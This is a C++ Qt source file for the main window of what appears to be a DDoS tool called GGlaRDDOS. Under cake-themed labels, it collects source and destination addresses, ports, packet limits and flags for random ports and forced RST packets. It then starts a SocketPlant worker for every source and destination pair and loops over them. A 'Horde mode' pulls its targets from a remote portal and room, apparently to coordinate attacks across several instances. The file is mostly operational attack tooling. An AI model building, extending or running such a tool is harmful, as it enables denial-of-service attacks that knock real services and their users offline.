#include "gglarddos.h"
#include "ui_gglarddos.h"

GGlaRDDOS::GGlaRDDOS(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::GGlaRDDOS)
{
    ui->setupUi(this);
    connect(ui->checkBox_Horde,SIGNAL(clicked()),this,SLOT(toggleHordeMode()));
    connect(ui->pushButton_cake, SIGNAL(clicked()),this,SLOT(cakeIsMitchunderstood()));
    bakingTheCake = false;
    initialStatusMsg = ui->statusbar->currentMessage();
}

GGlaRDDOS::~GGlaRDDOS()
{
    delete ui;
}

void GGlaRDDOS::toggleHordeMode(){
    bool hordeMode = ui->checkBox_Horde->isChecked();
    ui->lineEdit_Portal->setEnabled(hordeMode);
    ui->lineEdit_Room->setEnabled(hordeMode);
    ui->lineEdit_Extension->setEnabled(hordeMode);
    ui->lineEdit_Greg->setDisabled(hordeMode);
    ui->lineEdit_Wolf->setDisabled(hordeMode);
    ui->spinBox_Greg->setDisabled(hordeMode);
    ui->spinBox_Wolf->setDisabled(hordeMode);
    ui->spinBox_maxPkts->setDisabled(hordeMode);
    ui->checkBox_Greg->setDisabled(hordeMode);
    ui->checkBox_Wolf->setDisabled(hordeMode);
    ui->checkBox_fRST->setDisabled(hordeMode);
    ui->checkBox_RdPkt->setDisabled(hordeMode);
}

void GGlaRDDOS::toggleBaking(){
    bakingTheCake = !bakingTheCake;
    ui->lineEdit_Portal->setDisabled(bakingTheCake);
    ui->lineEdit_Room->setDisabled(bakingTheCake);
    ui->lineEdit_Extension->setDisabled(bakingTheCake);
    ui->lineEdit_Greg->setDisabled(bakingTheCake);
    ui->lineEdit_Wolf->setDisabled(bakingTheCake);
    ui->spinBox_Greg->setDisabled(bakingTheCake);
    ui->spinBox_Wolf->setDisabled(bakingTheCake);
    ui->spinBox_maxPkts->setDisabled(bakingTheCake);
    ui->checkBox_Greg->setDisabled(bakingTheCake);
    ui->checkBox_Wolf->setDisabled(bakingTheCake);
    ui->checkBox_fRST->setDisabled(bakingTheCake);
    ui->checkBox_RdPkt->setDisabled(bakingTheCake);
    if(bakingTheCake){
        ui->dateTimeEdit->setDate(QDate::currentDate());
        ui->dateTimeEdit->setTime(QTime::currentTime());
        ui->statusbar->showMessage(QString("The cake is baking!"));
        ui->pushButton_cake->setText(QString("The cake is a lie!"));
    }else{
        ui->statusbar->showMessage(initialStatusMsg);
        ui->pushButton_cake->setText(QString("Bake the cake!"));
    }
}

void GGlaRDDOS::cakeIsMitchunderstood(){
    if(bakingTheCake){
        if(QMessageBox::question(this, "YO IMMA LET YOU FINISH BUT ...", "U SURE YOU THINK THE CAKE IS A LIE?\n\n\t\t- Your friend and cook GLaRDDOS.",QMessageBox::Yes,QMessageBox::No) == QMessageBox::Yes){
            toggleBaking();
        }
    }else{
        /* THE NUMBERS OF VARIABLES TO BE SET IS TOO DAMN HIGH! */
        hrd = (HordeFactory::determinePortalColor(ui->lineEdit_Portal->text()));
        connect(hrd,SIGNAL(zulu(QStringList)),this,SLOT(bakeDatCake(QStringList)));
        if(ui->checkBox_Horde->isChecked()){
            hrd->connectToPortal(ui->lineEdit_Portal->text(),ui->lineEdit_Room->text(),ui->lineEdit_Extension->text());
        }else{
            QStringList immaempty;
            hrd->forceZulu(immaempty);
        }
        ui->statusbar->showMessage(QString("Finishing cake preparation ..."));
    }
}

void GGlaRDDOS::bakeDatCake(QStringList aaargh){
    qDebug() << "revc'd " << aaargh;
    QStringList argz;
    if(aaargh.length() == 0){
        argz << ui->lineEdit_Wolf->text().append(":").append(ui->spinBox_Wolf->text());
        argz << ui->lineEdit_Greg->text().append(":").append(ui->spinBox_Wolf->text());
        argz << ui->spinBox_maxPkts->text();
        argz << (ui->checkBox_Wolf->isChecked()?QString("1"):QString("0"));
        argz << (ui->checkBox_Greg->isChecked()?QString("1"):QString("0"));
        argz << (ui->checkBox_RdPkt->isChecked()?QString("1"):QString("0"));
        argz << (ui->checkBox_fRST->isChecked()?QString("1"):QString("0"));
        qDebug() << argz;
        BB::updateArgs(argz);
    }else{
        argz = aaargh;
        BB::updateArgs(argz);
        ui->lineEdit_Wolf->setText(BB::destinationsAsStrz);
        ui->lineEdit_Greg->setText(BB::sourcesAsStrz);
        ui->spinBox_Wolf->setValue(BB::destInitPort);
        ui->spinBox_Greg->setValue(BB::destInitPort);
        ui->spinBox_maxPkts->setValue(BB::maxPktsPerCombination);
        ui->checkBox_Wolf->setChecked(BB::rdDstP);
        ui->checkBox_Greg->setChecked(BB::rdSrcP);
        ui->checkBox_RdPkt->setChecked(BB::rdPkt);
        ui->checkBox_fRST->setChecked(BB::fRST);
    }

    if(BB::sources.length() == 0 || BB::destinations.length() == 0) {
        QMessageBox::warning(this,"YO IMMA LET YOU FINISH BUT ...", "Y U NO ENTER SOURCES AND DESTINATIONS?");
        ui->statusbar->showMessage(initialStatusMsg);
        return;
    }
    toggleBaking();
    QHostAddress src, dst;
    for(int i=0; i < BB::sources.length();i++){
        for(int j=0; j < BB::destinations.length(); j++){
            src = BB::sources.at(i);
            dst = BB::destinations.at(j);
            //QThreadPool::globalInstance()->start((new SocketPlant(&src,&dst,BB::sourceInitPort,BB::destInitPort,QString(""),BB::maxPktsPerCombination,BB::rdSrcP,BB::rdDstP,BB::rdPkt,BB::fRST)));
            SocketPlant *tmSP = new SocketPlant(&src,&dst,BB::sourceInitPort,BB::destInitPort,QString(""),BB::maxPktsPerCombination,BB::rdSrcP,BB::rdDstP,BB::rdPkt,BB::fRST);
            sleep(1);
            BB::allOfThem.append(*tmSP);
            //QtConcurrent::run(tmSP,&SocketPlant::run);
        }
    }
    bool notAllOfThemAreNull = true;
    for(int i=0; i < BB::allOfThem.length() && notAllOfThemAreNull; i++){
        SocketPlant tmSP = BB::allOfThem.at(i);
        notAllOfThemAreNull = (i==0)?tmSP.isTheCakeBaking():(notAllOfThemAreNull || tmSP.isTheCakeBaking());
        QtConcurrent::run(tmSP,&SocketPlant::run);
        sleep(1);
        if(notAllOfThemAreNull && i == (BB::allOfThem.length() - 1)){
            i = -1;
        }

    }
}
